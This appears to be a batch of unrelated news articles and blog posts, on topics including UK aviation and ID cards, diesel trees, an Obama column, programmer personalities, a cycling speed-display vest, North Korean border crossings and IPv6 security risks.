Britain 's leading airline bosses have accused the government of using their industry as a political pawn in the national identity card debate by forcing aviation workers to join the scheme next year .
In a scathing letter to the home secretary , Jacqui Smith , the chief executives of British Airways , easyJet , Virgin Atlantic and BMI said that forcing airport workers to have an ID card from November next year was " unnecessary " and " unjustified " .
All airport airside workers , who work in departure areas and on runways , must enrol in the scheme from next year under government plans , but the aviation industry is claiming it will bring no security benefits .
" First and foremost , no additional security benefits have been identified .
Indeed , there is a real risk that enrolment in the national ID scheme will be seen to provide an added , but ultimately false , sense of security to our processes , " said the British Air Transport Association ( Bata ) letter , signed by airline bosses including Willie Walsh of British Airways and Andy Harrison of easyJet .
It also accused the government of singling out the industry for politically motivated reasons , contradicting previous pledges that the scheme would be voluntary .
" This supports our view that the UK aviation industry is being used for political purposes on a project which has questionable public support , " said Bata .
The first wave of the ID card scheme will see the cards becoming compulsory for non-EU foreign nationals living in Britain this year , and for 200,000 airport workers and Olympic security staff from next year .
Parliament is to decide whether the £ 4.4bn scheme should be made compulsory for British citizens .
The aviation industry has consistently demanded greater state support for the increased security costs at airports since the liquid bomb scare in August 2006 , when expensive passenger and baggage screening measures were implemented by the government overnight .
Bata said it had worked closely with the Home Office and Immigration Service on tightening procedures , including longer passport checks , but said ID cards were a step too far and must not be made mandatory .
" The priority for government attention should be the improved efficiency of border processes , which would result in a more reliable operation and better levels of service for the travelling public , " said Bata .
" We would urge you to reverse the decision to compel airport airside workers to enrol in the national ID card scheme . "
A Home Office spokesperson said : " Biometric identity cards for airside workers lock identity to the individual providing far greater assurance of identity than currently exists within the aviation sector . "
The spokesperson added that it brought benefits to employers and employees and reassurance to the public by identifying workers in security - sensitive jobs , including airport posts .
Department for Transport officials expressed concerns last year that airside workers might take the components for a bomb into airports and store them in departure lounges for terrorists to pick up and assemble on planes .
The Home Office added that the scheme for airport workers had not been finalised and negotiations were ongoing .
A spokesman said : " A fully defined identity card scheme for airside workers is still being developed and we continue to work with and listen to the UK aviation industry , and other airport employers . "

Police in Longview say they watched a minivan turn into a driveway without signaling on Wednesday and bump into a home at a low speed .
They say the car was driven by Jennifer Lynn Rosenberg 's daughter .
Police say the girl told an officer she had just dropped her mother off at a bar .
They say they found Rosenburg at the bar and that she admitted having her daughter drive her there .
Rosenburg remains in the Gregg County Jail on a $ 2,500 bond .
A jail official declined to say whether she had an attorney .
A spokeswoman for Child Protective Services told the Longview News - Journal that the agency is investigating .

Farmers in North Queensland are doing their bit to be environmentally friendly by investing in a tree that produces diesel .
Over 20,000 trees have been sold to farmers in the tropics by the man who introduced the diesel tree from Brazil .
The tree produces an oil that can be extracted , filtered and used to power vehicles and farm machinery .
It is estimated a one - hectare crop could produce enough fuel for an average - sized family farm .
Mike Jubow , a former cane farmer and now a nursery wholesaler , says diesel - producing trees are a long - term investment .
" If I 'm lucky enough to live that long enough - I 'm 64 now - it is going to take about 15 to 20 years before they are big enough to harvest the oil so that I can use them in a vehicle , " he said .
" Principally , they are an ideal plantation tree for a family farm where , from generation to generation , you will harvest this oil so that your grandson and your great - grandson can still be virtually getting free fuel from these trees 30 to 50 years in the future . "
Mr Jubow says one hectare can produce around 12,000 litres of fuel per year .
" Last year we sold around about 20,000 of these trees .
This year we 'll sell probably similar figures , but we could sell more except that we can't get enough seed out of Brazil , " he said .
He says the trees need a lot of water to grow .
" They have got to be in the higher rainfall areas like coastal Queensland , [ which ] is ideal from around about Rockhampton north , " he said .
" They 're early growth .
They are known as a secondary successional tree , which means they will grow in the shade of other trees so it is wise to plant them as a mixed plantation with other faster - growing trees . "
Mr Jubow says there has also been interest in the diesel trees from the Department of Primary Industries ( DPI ) in Queensland and Farm Forestry .
" Farm foresters are very interested in this tree .
I do have some interest from the DPI in the Northern Territory and also Western Australia , " he said .
" There is a world - wide database on plant species that have been known to become pests .
This plant is not on that list . "
He says farmers who want to grow the trees need to know what they are doing .
" It is a very difficult tree to grow from the point of view of a nurseryman like myself - it is not something where an amateur could just grab a handful of seeds and go and grow them , " he said .
" It is not that simple .
They are a very difficult seed to germinate . "
If things go according to plan , it appears that the diesel trees could definitely be an asset to the environment .
" Here is a source of renewable energy , " Mr Jubow said .
" Not only that , when the tree reaches its use - by date , you 've got plantation - grown timber which is a very high - grade timber that is suitable for cabinet - making .
It is a very ornamental timber .
" You are still keeping it out of the CO2 system by harvesting the timber and milling it and putting it into high - quality furniture . "

The hope that Barack Obama has unleashed may not be so easily controlled , because change does not happen from the top down -- it happens from the bottom up .
THERE'S NO way of saying this without sounding a bit pretentious , but I was in Chicago a couple of weeks ago .
And the most instructive person I met may have been a frail old Black woman in a newsagent , who picked up a newspaper with a photo of Barack Obama on it , and thrust it under my nose .
" See him , " she said , " He 's in town today - - Barack Obama , in town today . "
And she had such a gleam of pride I wondered whether he was her son .
When you 're used to British politicians , this behavior seems staggering .
Supposing you were the most imaginative person in the world , creator of award - winning science fiction full of planets run by giant centipedes and made out of beetroot , you still would n't be able to imagine anyone gleefully grabbing a stranger and saying , " She 's in town today - - Hazel Blears , " even if she was their daughter .
So when Obama meets Gordon Brown this week , it 's going to make Brown feel even worse .
Maybe Obama will advise him " Gordon , you need to come up with a snappy three - word slogan that sums up your demeanor , the way I did with ' Yes we can ' . "
And as a result , the Labour Party 's slogan for the next election will be " Where am I ? "
But Obama 's appeal might not be just a trick of slogans and charisma .
It could be that he makes statements such as " I believe change does not happen from the top down , it happens from the bottom up .
Dr. King understood that .
It was those women who were willing to walk instead of ride the bus , union workers willing to take on violence and intimidation to get the right to organize .
Arguing , mobilizing and forcing elected officials to be accountable -- that 's the key . "
Compare this to his rival John McCain , whose campaign slogans include the powerful " As president , I promise to put America first . "
And then his supporters all cheer , as if they 're inspired , because he might have opted for " As president , I promise to put New Zealand first .
Bollocks to America ; that place sent me to Vietnam to get tortured . "
McCain 's latest campaign advert begins , " For some , 1968 was the summer of love .
But not for John McCain , as he was in Vietnam fighting for his country . "
You'd think that most people , having taken that route , would spend the rest of their lives going , " You 'll never guess what I did in 1968 - - instead of making love and listening to Jimi Hendrix , I went off to drop napalm and get my fingernails pulled out -- what a knobhead . "
They certainly should n't boast about it and suggest it means they 're the right person to make vital global decisions .
SO THE hope attached to Obama is exhilarating .
Across Harlem , where almost every cafe has huge pictures of Malcolm X and Martin Luther King , they now also display an " Obama ' 08 " poster .
Conservative America despises this sentiment , so Web sites and radio shows are packed with stories of how you can tell Obama hates his country , because there 's a picture of him not saluting the flag or dressed as a North Korean missile or something .
By the time of the election , there 'll be adverts saying , " Senator Barack Obama claims to love his country .
Yet several witnesses say they saw him trying to disrupt the first moon landing by hiding in the Sea of Tranquility and letting down the tires on Apollo 9 . "
But there 's unease among many of his supporters , especially now that his foreign policy team includes Madeline Albright and Warren Christopher , who were the most militaristic members of Bill Clinton 's government .
And Obama 's adviser Richard Danzig has proposed employing Robert Gates , Bush 's senior supervisor for the wars in Iraq and Afghanistan .
Now , his commitment to remove troops from Iraq within 16 months is dependent on " talking to the commanders on the ground . "
It 's not quite such a strident call for change , to say , " I will bring the troops home -- unless the commanders fancy staying , obviously , in which case , we 'll leave things as they are .
But mark my words , if they decide to flee , I certainly wo n't stop them . "
The reason for all this may not be personal weakness , or even electoral fear .
Because most of America will be run by the same people , no matter who wins the election -- the oil companies , Wal - Mart , Murdoch , etc .
And Obama has set out not to disrupt their rule , but to manage it .
But the hope he 's unleashed may not be so easily controlled , because change does not happen from the top down -- it happens from the bottom up .
Or , as articulated by the topical American program The Daily Show , " A disease is spreading across parts of the nation called ' Baracknophobia ' , meaning ' fear of hope . '
But the disease is so contagious , it 's even spread to Barack Obama , who is becoming afraid of himself . "

I recently posted about a set of programmer personality traits that I ’d noticed .
At first I thought they were relatively rare , but it seems to me much more prevalent than I ’d thought– even the widely read Ruby blogger “ raganwald ” seemed to admit that he had many of the qualities I was describing .
For now we ’re going to assume that people like this are not sick even though a subset of the traits may sound superficially like some cases of autism or even schizophrenia .
We are also going to completely leave out the question of drugs and ADD / ADHD diagnoses and instead focus on how the environment can be adapted to the programmer– and how people close to the programmer can best take advantage of his inherent nature .
A lot of these comments are going to be hit or miss depending on the person , but some of these may be helpful to the extent that the same mental frame of being is at work .
People with this type of personality might not do well in school , but are extremely good at picking out books and managing their own personal training program .
They will pick up a rare set of skills on their own just for the fun of it– skills that are n’t or ca n’t be taught in schools .
They are n’t attracted to the field of computing because of the money ( though that does n’t hurt ) but are terrified of getting stuck in a job where there ’s nothing left to learn .
People in other careers speak of a “ seven year itch ” phenomenon , but these guys have a “ two year itch . ”
These guys will change jobs not so much to get a raise … but to keep from getting bored .
As far as dating and relationships go , women should be careful with this guy .
When you first meet , you will become his “ pet project ” for a time .
When he ’s finally solved all of the problems ( as it were ) he ’ll be ready to move on to another project– probably something really abstract that you do n’t care about and ca n’t relate to .
He ’ll be shocked when you have no desire to support his new project and wo n’t understand why you ’re so hurt .
More than anything else , he ’ll need to feel that you accept him in spite of this change .
If you ca n’t deal with this transition and do n’t want to support him in his constantly changing obsessions , then the relationship ca n’t work .
If you are dating someone like this , make sure you extend the “ courtship ” phase to double what would make sense for any other couple .
Make sure you can deal with the changing dynamic of the relationship before you make things permanent by “ tying the knot ” .
The thing is , most people really never think .
At least , the concept of what thinking is to this programmer is radically different from that of “ regular ” people .
Most people just go to work , do the same old thing , and go home .
When they leave work , they leave work at work and go do something totally different .
Our programmer guy ca n’t seem to * stop * thinking .
If he ’s trying to solve something difficult , he will not stop as long as he ’s inspired .
He can go on a date and hardly hear a thing his girlfriend wants to talk about .
If there ’s a lull in the conversation , his brain will drift back into his project .
His obsession is like a force of gravity .
He ca n’t just turn it on and off .
He ’s afraid that he ’ll never get his train of thought back – if he changes gears he may never get back to it and all his effort will be lost .
Alternately , the effort of getting back in gear so many times in a week or two will gradually wear him down until he ’s exhausted , depressed , or worse .
People recognize this dynamic with introverts and extroverts .
It ’s not about someone being shy or not being talkative– it ’s about whether being in a group of people in a “ social ” situation is energizing or energy sapping .
For this guy , changing mental contexts is really draining – even more draining than having to be around people .
People do n’t tend to hold this sort of thing against introverts .
Our programmer friend probably does n’t even know the difference , though .
He looks at those social situations and does n’t see how they connect to his current stable of pet projects .
If he ’s unable to see a means of connecting the social situation to one of his obsessions , he ’ll get antsy and nervous .
He might even get a bizarre pit of dread welling up in his stomach at the very thought of attending such a party .
His thinking style is really more akin to the Sanford Meisner method acting school than it is to anything else .
He gets into a problem space the way they “ get into character . ”
And he truly * inhabits * the problem space .
He literally organizes his brain into a model of the problem .
He spends enormous amounts of effort to adapt his tools to his personal approach of thinking .
He ca n’t discuss data or requirements verbally – he has to put it into something like Microsoft Access and sit there with a couple of key people looking over his shoulder .
( Access is highly visual … and he can “ feel his way ” around complicated sets of data with it without explicitly thinking about what he ’s doing . )
Similarly , a Unix type prompt gives him god - like powers : he is everywhere in the system at once and can operate on just about any file without having to dig through an overwhelming number of screens and applications .
Yes he ’s highly visual in his learning style , but he ’ll do everything he can from within something like Emacs if he can get away with it because changing context between a dozen mediocre visual IDE ’s based on different idioms will sap his will to live– particularly if any of them are poorly designed .
This guy operates on raw intuition , but this does n’t mean he ’s illogical .
In fact , this if this guy hears anything when listening to something , it ’s the chain of reason .
He has a hard time with religious and political groups because he winces at the slightest mismatch in logic in what ’s said at the podium or in the pulpit .
And he never stops thinking about the big picture and how it relates back to the official rhetoric .
He might be attracted to the tidy consistency of ideologies such as Calvinism or Libertarianism , but he can end up in virtually anywhere depending on the makeup of his mental furniture and values .
Wherever he is , he ’s liable to be extremely hard on the leadership .
This guy reads between the lines of every single pronouncement : subtle nuances of timing , the juxtaposition of topics , and even of what gets left out speak volumes to him .
After any meeting he ’s liable to be hashing out the implications of it with someone and fretting over some perceived crisis .
Groups need to be very wary of this individual .
He can be their most zealous defender and just as quickly go to being their most ardent nemesis .
To forestall this , all you have to do is clean up your rhetoric a little .
To most people , “ it ’s just words ” … but this guy spends so much time in his own head , he does n’t really differentiate between ideas and reality .
Ideas * are * reality to this guy !
You do n’t have to give away the farm or anything – you just have to acknowledge that the guy has a point .
He * needs * quiet talks to reassure him that he ’s not crazy .
He understands the need for compromise or specialization … but you need to be up front and clear about what you ’re sacrificing or you ’re nothing but a used car salesman to him .
This guy is full of mystifying contradictions .
He ’s an introvert , but you might see him talking and engaging all sorts of people .
He swings from being incredibly intimate to being incredibly distant .
He ignores entire swaths of details as being someone elses problem , but will go out and solve the most random things that no one has even asked him to work on .
What ’s going on with this ?
At work , he might not even talk to a certain strata of people .
But after doing some small task for them he might start dropping in to check on them and make sure they ’re still happy .
Over time , he ’ll end up “ walking a beat ” and touching base with all sorts of people he ’s worked with .
( In college , he probably had friends from several contradictory “ cliques . ” )
If people start causing disruptions near his desk , he ’s liable to get up and make a round in spite of whatever he ’s supposed to be working on .
Random people will confide in this guy … and he ’ll often take back his impressions from these talks and apply them to his secret projects .
But he loves doing favors for people .
People just have to be able to communicate a little , have a finite self - contained need , and not send him on too many wild goose chases in the process .
The tasks can be anything – he just needs a chance to show off his “ super powers ” and look smart .
And he genuinely does care about people .
Due to his agonizing experiences in school and his hatred of bad interfaces , he really is serious about doing what he can to make people ’s job ’s better .
With a few of these sorts of favors under his belt , he can relate to just about anyone .
But without these experiences to ground him and set the tone , he ’s often at a loss what to do or say .
He ’s just lost .
( This is part of why he has no understanding of “ regular ” social activities . )
Traditional “ ice breaker ” exercises mean nothing to this person .
The way to get him to “ bond ” with people is to make his skills relevant somehow to a single individual : it has to be ‘ real ’ , there ’s almost no other way around this .
Remember , this guy ’s mental furniture is completely given over to one of a half dozen secret schemes .
The only way to make a person “ real ” to him is to get them lounging around in that furniture occasionally .
Finally , this guy often does n’t know what he ’s thinking or feeling about things .
His girlfriend will often know * hours * before he does .
He ’s capable of writing incredibly detailed blog posts about a topic and then look at it when he ’s done and then be shocked that such ideas were even brewing in the back of his head .
This is a big part of what causes his procrastination .
He ’s always thinking about every single angle of a problem , but he ’s not fully conscious of such thoughts until he ’s engaged in a specific task .
His subconscious mind will often drag him down if it thinks that the task at hand is n’t “ real ” , wo n’t truly be appreciated or recognized , or if the people that are asking for it are n’t serious or do n’t truly know what they want .
If he ’s got an idea about something , he ’s often better off to strike while the iron is hot .
And if he seems to want to work on something else , he ’ll often pick up the random unverbalized things he needed in order to “ unstuck ” himself on some of his other tasks that he was hung up on .
Yes , he often finds out what he ’s thinking by doing something totally different than what ’s required !
This is why handing over to some other micromanager the authority of order his to - do list is dangerous : there are a lot more dependencies and variables than what anyone else will see or care about , but that are critically important to our programmer / ” genius ” .
This is also why he does n’t tend to take initiative to deal with things when he starts to slide off track– he ’s almost unable to pin down what ’s really bothering him at any given time .
In an ideal world , he ’d have “ Joan June Cleaver ” at home taking care of all the annoying details of life .
He ’d have someone to check him each morning to make sure he has dressed himself properly and has n’t forgotten his lunch .
Socially , he ’d be expected to do no more than “ show up ” to certain key events .
He ’d have an accountant take care of his personal finances , and a secretary to make sure he did n’t blow off key tasks and meetings .
In education , he ’d be mentored , not schooled .
At work , he ’d be steered , not “ managed ” .
At least once a year , he ’d have the chance to work on a two - month project that he prototypes and architects him self – a project where he gets to learn a new language or technique while filling a specific unmet niche .
He ’d have confidants and cheerleaders … and informal “ rap session ” type meetings where he has the chance to think out loud and be appreciated as the “ genius ” that he is and the chance to do brief “ show and tell ” demos of his bizarre accomplishments .
In a perfect world , he ’d be accepted as he was and not expected to dope himself up or suppress his personality in order to fit in to whatever lame routine or tradition that ’s evolved for everyone else .

The manufacturers say sales are about to hit the 4,000 mark
The makers of " Slightest Touch " say their device can give women longer , better and more intense orgasms .
They claim their device can trigger an orgasm without touching a woman 's genital area .
According to the manufacturers , Slightest Touch works by stimulating the body 's sexual nerve pathway .
' Turned on '
Women start by drinking an electrolyte sports drink 20 minutes before using the device .
They then apply two white electrode pads inside their ankles .
These pads are connected to the Slightest Touch device , which is about the size of a personal stereo .
If women feel they have problems with either sex or relationships , it 's better to go and get professional advice about the possible causes , before spending a lot of money on a particular product
Family Planning Association spokeswoman
The device stimulates the nerves sending gentle pulses up the woman 's leg for between 10 and 30 minutes leaving women on the verge of climax .
" The Slightest Touch does not provide an orgasm , " said Cherisse Davidson , the company 's director of customer support .
" It gently stimulates the sexual nerve pathways taking the woman to a pre-orgasmic plateau where she dangles on the edge of orgasm for as long as she wants .
" From there , gentle stimulation can then effect the orgasm . "
BBC News
Online has been unable to get independent scientific verification that the product works .
But Ms Davidson , who first tested the device three years ago , insists it is effective .
" It can be of great benefit to many women , " she told BBC News Online .
" I 've been using mine for three years and I just love it . "
She said the product can help women who simply want to improve their sex lives and those who have problems achieving orgasm .
However , the Slightest Touch , which sells for $ 139.95 , is not suitable for everyone .
It is not recommended for women taking anti-depressants , those who are pregnant or those with some underlying medical conditions such as heart problems .
The product which was launched in the United States six months ago is now starting to getting attention in Europe .
Ms Davidson said the company had now sold almost 4,000 devices - some to customers in Britain .
However , the UK's FPA , formerly the Family Planning Association , urged women to get professional advice before spending their hard earned cash .
" If women feel they have problems with either sex or relationships , it 's better to go and get professional advice about the possible causes , before spending a lot of money on a particular product , " said a spokeswoman .

Chloe Marshall is the teenage beauty queen who broke the mould by becoming the first size 16 beauty queen contender to make it to the finals of the Miss England contest .
And now she reveals her shapely body in the official Miss England bikini – not forgetting her tiara of course – in her first bikini photoshoot since winning the Miss Surrey title .
Posing confidently poolside in the brief white gem-embossed Miss England bikini which she 'll wear in the pageant in July , Chloe appears completely lacking in self - consciousness .

Curves allowed : Chloe Marshall poses confidently in an official Miss England bikini for her first magazine photoshoot
The 17 - year - old trainee beautician does n't look like your average beauty queen .
And she could n't be happier about it .
She said : " It 's what I was born to do – posing for the camera .
And as I keep saying , I love my body .
" People seem desperate to get me to say that I do n't , that deep down I 'm not happy and would rather be thin , but the fact is I would n't change myself at all .
" Do I have fat days ?
Of course , but what woman does n't ! "
Chloe beat a host of slimmer hopefuls to be named Miss Surrey earlier this month , and hopes to win the national competition in July .

Winner : Chloe was the first size 16 competitor to win the Miss Surrey title , and will now compete for the Miss England title .
She says she is completely happy with her curves and ' loves ' her body
The Guildford - born plus - size model weighs 12st 8lb , is 5ft 10in tall and has a 38 DD bust .
But although she is the average size for a woman , in the age which has seen the rise of the scarily thin size zero model , she certainly stands out .
Chloe said reaction has been mainly positive , but she admitted in an interview with Hello magazine , that there had been some snide remarks with one writer accusing her of " promoting obesity " .
Chloe told Hello : " I 'm a size 16 , I eat well , I exercise regularly – I jog , swim , and work out with weights .
" What I am promoting is a healthy girl who looks after herself and does n't try to force her body to be something its not . "
The teenager , who has been signed up by the Models Plus agency , said most of her rivals were size eight or ten .
" Everybody thinks you have to be a tall , slim blonde and I 'm a curvy brunette , " she added .
" I want to show it is possible to be beautiful and not a standard size zero . "
UPDATE 9/11/2008 : Look ma !
We have a whole website for the Speed - Vest now — you can sign up for news about the V2 vest , get yer press - blurbs on ,
and stay informed about the 2009 Tour De Speed - Vest !
Furthermore , we ’ve now got video of the vest in action here .
But if you ’re looking for some fairly nerdy reading about how to make one of these yourself … read on !
The SPEED - VEST is a bicycle safety device and advocacy tool which displays the wearer ’s current speed on their back in easy - to - read lighted numerals .
It improves rider conspicuity while legitimizing bicycle speeds on the roadway .
Originally conceived by Brady Clark and engineered by Mykle Hansen , it just won the Hub Bike Shop ’s Bike Gadget Contest in Minneapolis , MN .
The system consists of a wheel speed sensor , a wearable numeric display and a small computer that does the thinking .
The computer is an Arduino : an open - source embedded computing platform powered by an Amtel microcontroller .
It runs for 6 hours on a 9 volt battery , and is about this big :
The numeric display is made from electro - luminescent wire , supplied to us by CooLight.com .
El - wire glows brightly when supplied with a very small amount of high voltage , high - frequency current .
It ’s cheap , flexible and fairly durable .
One AA battery can power the SpeedVest display for up to 6 hours .
This project was my first foray into microcontrollers .
Not knowing much about electronics , I imitated this circuit closely ; however the Arduino platform , suggested by the members of Dorkbot PDX , was much easier to use than I had imagined and quickly became my new favorite computer .
I would n’t call the project arduous , but the most time - consuming aspect was probably soldering the circuit together on the Arduino ’s prototyping daughterboard .
Next time , I ’m going to learn how to make my own printed circuit board .
Meanwhile , Brady designed a template for the el- wire digits , based on the digits in old Nixie tubes .
It seemed appropriate — it ’s almost the same technology , really .
Since I had 12 pins to play with , and since you can only overlap so much el- wire , we put five digits on the right and seven on the left :
We mounted the el- wire on a piece of black denim , taping on the template as a guide , using a technology the Coollight.com folks hipped us to : the Buttoneer .
I do n’t know how well it works for re-attaching buttons , but it ’s great for this .
We achieved sharp corners by running the wire behind the denim through a hole , and then back through to the front at another angle .
In order to display the SpeedVest for judging at the Gadget contest , we needed a mannequin .
So , we borrowed another great piece of Internet advice .
Witness below the birth of the creature known as “ Packing Tape Brady ” , made possible through the assistance of super - assistant Heather Anderson :
We were up most of the night before the event deadline : debugging code , writing up handouts , fixing bad solder , screen - printing text onto reflective backing , velcro-ing everything together , and arguing about the relative artistic worth of the digits zero and seven .
The next morning , we got it all together and brought it to the Bell Museum with about 15 minutes to spare .
( Somehow we neglected to get a picture of it working — but it worked ! )
Despite some excellent other entries ( including the zoobombariffic Superman Bike ! ) , we were tickled pink when the judges at the Bike - In presented Brady and myself with a $ 150 gift certificate from the sponsoring bike shop , the HUB bike co-op of Minneapolis .
And what a gift certificate !
This beautiful hand - drawn check would have been prize enough , even if it had n’t been financially negotiable .
The Speed - Vest will be undergoing speed trials in Portland , Oregon at an undisclosed test track this Sunday night .
If you are interested in bringing the Speed - Vest to your town or event , or just want more info , please drop us a line :

Hunger is driving more and more North Koreans to escape to China , crossing a river frontier at the mercy of traffickers and corrupt police .
The BBC has obtained extraordinary footage of the traffic , shot by South Korea 's Chosun Ilbo newspaper .
In the middle of the night a naked man emerges from the freezing waters of the Tumen River which divides North Korea and China .
He is a former soldier who now bribes the border guards so he can cross the river , trading in whatever he can .
Sometimes it 's women .
Tonight - caught on camera - he arrives alone carrying drugs .
Downstream - the camera 's night vision lens picks out a woman who wades gingerly into the icy flow with her guide
An extended version of the footage can be seen on BBC Two 's Newsnight programme at 2230 BST on 29 May Shivering , he opens his mouth and brings out a package sealed in plastic .
It is a sample of heroin manufactured in North Korea .
" Where is the woman ? " demands the Chinese buyer , who 's waited two weeks for the man to appear and is exasperated to see him turn up alone .
" She could n't come tonight .
But I 've brought you these drugs , " he answers .
" Bangupi , " he calls it .
" It is the best quality .
If you want more I will bring you a kilo .
The woman will come next time . "
" Did you pay the soldiers ? " the South Korean cameraman asks .
" Yes of course , 500 Chinese Yuan , " he replies ( about $ 70.00 or £ 35.00 ) .
His teeth rattling with cold , he turns back into the icy waters and pitch black to the North Korean side before the border guards he 's bribed change shifts .
' It 's a trick '
Downstream , the camera 's night - vision lens picks out a woman who wades gingerly into the bone - chilling flow with her guide .
The deadly risks taken by those fleeing North Korea are all too apparent
She has paid to cross to China , a land of plenty for North Koreans who now face starvation as harvests at home fail and food prices soar .
She crosses the river naked - keeping her clothes dry so as not to be weighed down .
Wading ashore on the Chinese side she is met by the South Korean camera crew and struggles with frozen fingers as her clothes refuse to go on .
" It 's so cold . "
Her teeth chatter .
" My foot 's stuck . "
What she does n't know is - a man is waiting .
As a Chinese citizen , he too is in search of a better life abroad and he wants a North Korean wife as his passport to South Korea .
But any talk of South Korea , the North 's old Cold War enemy thrusts her into panic .
It 's hunger that has driven her to leave .
Not ideology .
And she does n't want to be charged with treason if it turns out the people now surrounding her are North Korean secret police in disguise .
" I know it 's a trick , " she tells them , making clear she is not going to agree .
" I 'd be arrested and sent to a prison or labour camp . "
Body frozen in ice A new day .
The river is frozen solid under a brilliant blue sky .
In the distance , what appears as a pile of stones turns , as the camera moves closer , into a woman 's frozen body lying half - submerged in the ice .
The Chinese guide who brought them there kicks the fallen woman 's frozen foot .
" Rock hard , " he says , and relieves himself nearby .
Had the crew not been there to film it , there would be no trace today of this unknown , nameless woman - just one of the many who embarked on this risky escape and did not make it .
Weighed down by her clothes , she froze where she fell until the ice melted and she was washed away .
' They live like ghosts '
But what is the fate of those who make it across into China ?
Geum - hee was caught in China , sent back and forced to have an abortion Some are sold into the sex industry .
Some marry - unofficially - but they must live in hiding from the authorities lest they are sent back and punished .
Their children too live as ghosts .
Without official papers they are unable to access education or medical care .
" I just wish I had an official Chinese registration number , " says one .
" Even if I were crippled or poor , if I had a number I would n't have to worry about being sent back . "
Shunshei is 11 .
Her mother was so frightened of being caught by the Chinese and sent back to North Korea she fled China , leaving Shunshei behind .
" When your mum sees you , " her grandmother tells her kindly , " she 'll say you look great in your new dress . "
" Do n't lie to me ! " cries Shunshei .
" My mum never calls - and she 's never coming back . "
Her mother now lives in Japan with a new husband who knows nothing of her little girl .
Forced abortion A small number of people try to escape through Laos and Thailand to South Korea .
The numbers reaching the south have doubled in the last few years but the journey is dangerous and difficult .
Few are as brave as Geum - hee .
As a tour guide in China near the border she 's hidden her North Korean origins by disguising her accent and speaking fluent Mandarin .
But she too is illegal .
She escaped from North Korea once before but was caught by the Chinese and sent back .
They refuse to recognise North Koreans as refugees , insisting they 're economic migrants with no right to stay .
She was pregnant .
" Against my will , they forced an abortion injection into the foetus .
I could n't do anything to stop them because there was an agent next to me . "
Her voice breaks with emotion as she describes what happened next .
She escaped again and rejoined her husband but her next baby was born with cerebral palsy and cannot walk .
He is a bright child and keen to go to school .
But as the son of an illegal immigrant and disabled to boot there 's no chance .
Geum - hee decides she has to leave .
Not the overland journey through Laos and Thailand but right through Beijing 's shiny new airport .
She has bought a fake Chinese passport and is followed by the camera as she heads through passport control to Thailand and safety .

It may be years before the new internet protocol IP v6 takes over from the current IP v4 , but a security researcher is warning that many systems – corporate and personal – are already open to attack through channels that have been enabled on their machines to support IP v6 traffic .
Joe Klein , a security researcher with Command Information , says many organizations and home users have IP v6 enabled on their systems by default but do n't know it .
They also do n't have protection in place to block malicious traffic , since some intrusion detection systems and firewalls are n't set up to monitor IP v6 traffic , presenting an appealing vector through which outsiders can attack their networks undetected .
" Essentially , we have systems that are wide open to a network , " says Klein , who is a member of an IP v6 task force and will be speaking about the issue tonight at the HOPE ( Hackers on Planet Earth ) conference in New York .
" It 's like having wireless on your network without knowing it . "
The internet is moving to IP v6 because IP v4 is running out of addresses .
Estimates of when IP v4 addresses will be exhausted have varied .
Command Information has a widget on its web site counting down the number of IP v4 addresses still available each time the American Registry for Internet Numbers assigns an address or block of addresses .
By the widget 's count , the supply of IP v4 addresses – currently at around 620 million – will run out in about 917 days , or about two and a half years .
Klein says many organizations and home users have installed operating systems and other software on their networks and machines that have been set up to enable IP v6 connections by default , despite the fact that there 's very little IP v6 traffic on the net as of yet .
Because IP v6 traffic is n't common yet , many protection systems are n't set up to guard against malicious IP v6 traffic .
( China will be using IPv6 to provide coverage of the Beijing Olympics this year . )
Attacking a system with inbound malicious IP v6 traffic is n't the only risk to a network .
Just having IP v6 enabled on a system – whether it 's turned on by default or not – can also allow an attacker who gets in through traditional means ( or an insider for that matter ) to transmit data out of the system undetected through IPv6 .
In 2002 , Lance Spitzer of the Honeynet Project revealed that one of the Honeynet 's Solaris honeypots in the U.S. was compromised by an intruder who entered the system by traditional means , then enabled IP v6 to tunnel data out of the network to a host in another country .
The researchers uncovered the data transfer only because they were using Snort , but they were unable to decode the data .
[ A discussion thread to Spitzer 's post at the link I provided gives additional information about IP v6 attacks and protection . ]
The issue should be of particular concern to the U.S. government , since it 's leading the way in transitioning to IPv6 .
The federal government required that the backbone networks of all of its agencies be moved to IP v6 by the end of June 2008 .
Last year the Defense Department grabbed a block of about 281 trillion IP v6 network addresses .
The government is also requiring vendors to produce products that enable IP v6 , though it 's unclear how many security products are up to date in monitoring and protecting IP v6 connections .
Calls to the Department of Defense were not immediately returned .
An IT security specialist who works for a DoD agency , however , says he is not aware of any security guidelines that have been passed down yet from the DoD 's Defense Information Systems Agency with regard to IPv6 and says no one should assume the DoD is on top of things with regard to the security of IP v6 - enabled networks .
" Certainly awareness of the considerable differences between IPv4 and IPv6 is an integral part of securing IP network traffic as the switchover progresses , " says the worker , who asked to remain anonymous because he 's not authorized to speak with the press .
" But self - awareness has never been a strong suit of federal IT infrastructure . "
It 's not just networks and home PCs that are vulnerable , however .
Klein says thousands of mobile phones use operating systems that enable IP v6 as well .
People with phones that operate with Windows Mobile 5 or 6 are particularly vulnerable , he says , because the operating system does n't come with a firewall to protect them .
" If you can identify the address , you have the ability to portscan and exploit a handset , " Klein says .
Josh Rhodes , a spokesman for Microsoft , could n't confirm that Mobile 5 and 6 come with IP v6 enabled by default but said that if a hacker manages to get into a phone , passwords and other safeguards would protect data on the device .
When asked what those safeguards might be , he pointed out Mobile 6's memory card encryption feature and the remote wipe capability that allows an organization to remotely erase data on a phone that 's been compromised .
The latter , of course , assumes that a phone owner or his company knows when a phone has been compromised .
With regard to the number of users this might affect , Rhodes did n't have a total number for Windows Mobile 5 and 6 users but said that Microsoft sold more than 11 million licenses for Windows Mobile in the last year alone .
In addition to Windows Mobile 5 and 6 , Klein says other mobile phone systems are vulnerable as well , though he declined to name them until he's had a chance to contact the companies .
He did say , however , that Blackberries and iPhones are not vulnerable .
Klein has prepared a list of other general systems that have IP v6 enabled by default – such as Windows Vista – which you can see in the screenshots at right .
Mac OSX is IPv6 - enabled by default , but the Mac firewall should protect users as long as they do n't enable file - sharing or web server on their system , Klein says .
To determine if your phone , laptop or desktop has IP v6 enabled , you can go to this page .
Click on the hyperlink on the right side of the page for the IP v6 test .
If no page loads , you 're fine .
If the page returns an IP address for your machine , then you have IP v6 enabled .
Klein says system administrators who do n't map their systems to know what they have and what 's enabled on their networks are not only opening themselves to attack , but could be considered non-compliant under Sarbanes - Oxley , HIPPA and other regulations if they have n't secured IP v6 , even though these regulations do n't require auditors to validate that IP v6 is turned off .
